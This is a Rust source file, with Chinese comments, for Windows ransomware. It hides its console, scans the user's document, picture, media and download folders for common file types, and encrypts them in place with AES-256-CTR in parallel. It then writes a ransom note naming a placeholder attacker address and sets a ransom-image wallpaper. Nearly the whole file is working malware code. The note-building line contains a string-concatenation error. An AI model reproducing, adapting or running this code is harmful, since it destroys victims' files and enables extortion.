#![windows_subsystem = "windows"]
use std::{
    thread,
    env,
    fs,
    io::Cursor,
    sync::Arc,
    time::Duration,
    fs::{OpenOptions,File},
    path::{Path, PathBuf},
};
use aes::Aes256;
use ctr::cipher::{KeyIvInit, StreamCipher};
use ctr::Ctr128BE;
use image::ImageFormat;
use image::io::Reader as ImageReader;
use memmap2::MmapMut;
use rand::{rngs::OsRng, RngCore};
use rayon::prelude::*;
use walkdir::WalkDir;
use winapi::um::winuser::{SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE, SPIF_SENDWININICHANGE};
use widestring::WideCString;

use std::os::windows::fs::OpenOptionsExt;

const FILE_FLAG_SEQUENTIAL_SCAN: u32 = 0x0800_0000;

const ROOT_DIR: &str = r"C:\";

const IMAGE_B64: &str = include_str!("image.b64");

// 用户数据文件夹
const USER_DATA_DIRS: &[&str] = &[
    "Documents", "Desktop", "Downloads", "Pictures", "Videos", "Music", "Favorites"
];
// 要跳过的目录
const EXCLUDE_DIRS: &[&str] = &[
    "Windows", "Program Files", "Program Files (x86)", "ProgramData", "$Recycle.Bin", "AppData",
];
// 包含的文件扩展名
const INCLUDE_EXTS: &[&str] = &[
    "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "txt",
    "jpg", "jpeg", "png", "mp3", "mp4", "zip", "rar", "db"
];

fn collect_files(root: &Path) -> Vec<PathBuf> {
    WalkDir::new(root)
        .into_iter()
        // 在进入每个目录时判断是否应该跳过
        .filter_entry(|e| {
            if e.depth() == 0 {
                true
            } else {
                let name = e.file_name().to_string_lossy();
                !EXCLUDE_DIRS.iter().any(|d| name.eq_ignore_ascii_case(d))
            }
        })
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_file())
        .filter(|e| {
            e.path()
             .extension()
             .and_then(|s| s.to_str())
             .map(|ext| INCLUDE_EXTS
                    .iter()
                    .any(|allowed| allowed.eq_ignore_ascii_case(ext)))
             .unwrap_or(false)
        })
        .map(|e| e.into_path())
        .collect()
}

// AES-CTR 加密
fn encrypt_file_mmap(path: &Path, key: &[u8; 32], iv: &[u8; 16]) -> std::io::Result<()> {
    let file = OpenOptions::new()
        .read(true)
        .write(true)
        .custom_flags(FILE_FLAG_SEQUENTIAL_SCAN)
        .open(path)?;

    let mut mmap = unsafe { MmapMut::map_mut(&file)? };
    let mut cipher = Ctr128BE::<Aes256>::new(key.into(), iv.into());
    cipher.apply_keystream(&mut mmap[..]);
    let mut rng = OsRng;
    let delay_ms = (rng.next_u32() % 100) as u64;
    thread::sleep(Duration::from_millis(delay_ms));
    mmap.flush()?;
    Ok(())
}

pub fn set_wallpaper_from_base64(b64: &str) -> Result<(), Box<dyn std::error::Error>> {
    let img_bytes = base64::decode(b64)?;
    let img = ImageReader::with_format(Cursor::new(&img_bytes), ImageFormat::Png)
        .decode()?;
    let mut bmp_path: PathBuf = env::temp_dir();
    bmp_path.push("note.bmp");
    img.write_to(&mut File::create(&bmp_path)?, ImageFormat::Bmp)?;
    let wide_path = WideCString::from_str(bmp_path.to_string_lossy().as_ref())?;
    let success = unsafe {
        SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            wide_path.as_ptr() as *mut _,
            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE,
        )
    };
    if success == 0 {
        Err("SystemParametersInfoW Failed".into())
    } else {
        Ok(())
    }
}

fn main() {
    let user_profile = env::var("USERPROFILE").unwrap_or_else(|_| ROOT_DIR.to_string());
    let mut files = Vec::new();
    for dir in USER_DATA_DIRS {
        let path = PathBuf::from(&user_profile).join(dir);
        if path.exists() {
            files.extend(collect_files(&path));
        }
    }

    if files.is_empty() {
        eprintln!("未找到要加密的文件，程序退出。");
        return;
    }

    // 随机生成 AES-256 CTR 的 key 和 iv
    let mut key = [0u8; 32];
    let mut iv  = [0u8; 16];
    OsRng.fill_bytes(&mut key);
    OsRng.fill_bytes(&mut iv);
    let key = Arc::new(key);
    let iv  = Arc::new(iv);

    // 并行加密
    files.par_iter().for_each(|path| {
        if let Err(err) = encrypt_file_mmap(path, &*key, &*iv) {
            eprintln!("文件加密失败 {}: {}", path.display(), err);
        }
    });

    // 在桌面写入勒索信
    let desktop: PathBuf = env::var("USERPROFILE")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from(&user_profile))
        .join("Desktop");
    let note_path = desktop.join("README.txt");
    let note = "Your files have been locked.\nContact: attacker@example.com\n" + 
               "Decrypt key: " + &base64::encode(&key) + "\n" +
               "IV: " + &base64::encode(&iv);
    if let Err(err) = fs::write(&note_path, note) {
        eprintln!("写入勒索信失败: {}", err);
    }
    // 设置桌面壁纸
    if let Err(err) = set_wallpaper_from_base64(IMAGE_B64) {
        eprintln!("设置壁纸失败: {}", err);
    }
    println!("Encryption complete. Ransom note dropped.");
}
